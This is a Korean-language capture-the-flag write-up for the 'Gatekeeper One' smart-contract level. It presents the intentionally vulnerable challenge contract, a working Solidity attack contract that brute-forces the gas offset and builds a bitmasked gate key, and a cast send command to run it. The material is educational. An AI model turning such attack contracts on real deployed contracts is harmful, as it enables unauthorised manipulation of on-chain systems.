# Gatekeeper One — 풀이 정리

목표
- `enter(bytes8 _gateKey)`를 호출해 `entrant = tx.origin` 이 되도록 하여 레벨을 통과합니다.

문제 코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

전체 전략 요약
- gateOne: EOA가 직접 호출하면 실패하므로 중계 컨트랙트(EOA → 공격 컨트랙트 → Gatekeeper)를 사용해야 합니다.
- gateTwo: `gasleft() % 8191 == 0` 조건을 맞춰야 하므로 호출 시 남아있는 가스를 브루트포스(트랜잭션 내 반복 호출)로 맞춥니다.
- gateThree: `_gateKey`의 바이트 패턴을 조작해 세 가지 수학적 조건을 모두 만족시키는 값을 전달합니다.

Gate One (요지)
- 조건: `msg.sender != tx.origin`
- 해결: 공격용 컨트랙트를 배포하고 EOA가 공격 컨트랙트의 함수를 호출하게 하면, 공격 컨트랙트가 `enter`를 호출할 때 `msg.sender`는 공격 컨트랙트 주소가 되어 조건 통과.

Gate Two (요지)
- 조건: `gasleft() % 8191 == 0`
- 문제: 정확히 이 시점까지 남아있는 가스를 예측하기 어렵습니다. 트랜잭션 전반의 가스 소모(배포자/콘텍스트/외부 호출 등)가 영향을 줍니다.
- 해결: 공격 컨트랙트 내부에서 반복 루프(또는 외부에서 여러 가스값을 시도)로 `call{gas: ...}`를 여러 번 시도해 성공하는 가스 오프셋을 찾습니다. 단일 트랜잭션 안에서 여러 시도를 묶어 비용을 줄입니다.

Gate Three (세부 규칙)
세 개의 `require`는 `_gateKey`(bytes8)를 다양한 정수형으로 캐스팅해 비교합니다. 핵심은 바이트별 위치를 이해하는 것입니다.

- 요구사항 정리:
  1) `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))`
     - 좌변: `_gateKey`의 하위 4바이트(바이트5..8)
     - 우변: 하위 2바이트(바이트7..8) 가 `uint32`로 승격되어 비교
     - 결론: 바이트7..8(하위 2바이트)이 동일하면 성립

  2) `uint32(uint64(_gateKey)) != uint64(_gateKey)`
     - 좌변: 하위 4바이트
     - 우변: 전체 8바이트
     - 결론: 전체 8바이트가 하위 4바이트로 축소된 값과 달라야 하므로, 상위 4바이트(바이트1..4) 중 적어도 하나는 0이 아니어야 함

  3) `uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))`
     - 우변: `tx.origin`(EOA, 20바이트)을 `uint160`으로 취한 뒤 `uint16`을 취하면 EOA의 하위 2바이트가 됨
     - 좌변: `_gateKey`의 하위 4바이트
     - 결론: 하위 4바이트의 상위 2바이트(바이트5..6)가 0이고 하위 2바이트(바이트7..8)가 `uint16(tx.origin)` 값과 일치해야 함 → 즉 바이트5..6 == 0x0000, 바이트7..8 == lower16(tx.origin)

따라서 `_gateKey` 바이트 형태는 다음과 같이 제약됩니다:

```
xx xx xx xx 00 00 YY YY
```

여기서 `YY YY`는 `uint16(uint160(tx.origin))` (EOA의 하위 2바이트)와 같아야 하고, `xx xx xx xx`는 상위 4바이트로, 적어도 하나는 0이 아니어야 합니다.

간단한 생성 규칙
- gateKey를 EOA 기반으로 생성하려면 다음 비트마스크를 사용하면 편합니다:

```solidity
bytes8 gateKey = bytes8(uint64(uint160(attackerEOA))) & 0xFFFFFFFF0000FFFF;
```

이 표현은 EOA(20바이트)의 하위 8바이트를 가져오고, 가운데 바이트(바이트5..6)를 0으로 만든 뒤 나머지는 유지합니다.

공격 컨트랙트 (예시)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract Attack {
    address public gatekeeperOne;

    event SuccessOn(uint256 n);

    constructor(address _gatekeeperOne) {
        gatekeeperOne = _gatekeeperOne;
    }

    function attack(uint start) public {
        bytes8 gateKey = bytes8(uint64(uint160(msg.sender))) & 0xFFFFFFFF0000FFFF;

        for (uint i = start; i < start + 100; i++) {
            (bool success, ) = gatekeeperOne.call{gas: 8191 * 5 + i}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            if (success) {
                emit SuccessOn(i);
                return;
            }
        }

        revert("not found in range");
    }
}
```

사용 예시 (Foundry / cast)

1) 공격 컨트랙트 배포: `forge create` 또는 `cast send`로 배포

2) EOA가 공격 컨트랙트의 `attack(start)` 호출: start를 0, 100, 200... 등으로 늘려가며 성공값을 찾습니다.

```bash
cast send <ATTACK_CONTRACT_ADDR> --rpc-url <RPC_URL> --private-key $PRIVATE_KEY "attack(uint256)" 200
```

성공 시 로그(또는 이벤트)를 통해 어떤 `i`에서 성공했는지 확인할 수 있습니다.

팁 및 주의사항
- `gasleft()` 조건은 호출 시점의 남은 가스에 따라 달라집니다. 여러 번 시도해 성공하는 오프셋을 찾아야 합니다.
- 브루트포스는 온체인 트랜잭션이므로 비용이 듭니다. 공격 컨트랙트 내부에서 루프를 사용해 한 트랜잭션에서 여러 가스값을 시도하면 비용을 크게 절감할 수 있습니다.
- `revert()`가 발생해도 트랜잭션은 실행되며 일부 가스는 소모됩니다. `assert()` 실패는 전체 가스를 소모하므로 주의하세요.

결론
- GatekeeperOne 문제는 `tx.origin`/`msg.sender`의 차이, `gasleft()`의 가스 오프셋, 그리고 바이트-레벨 타입 캐스팅 규칙을 조합해 푸는 문제입니다. 위 공격 컨트랙트 및 방법으로 레벨을 통과할 수 있습니다.
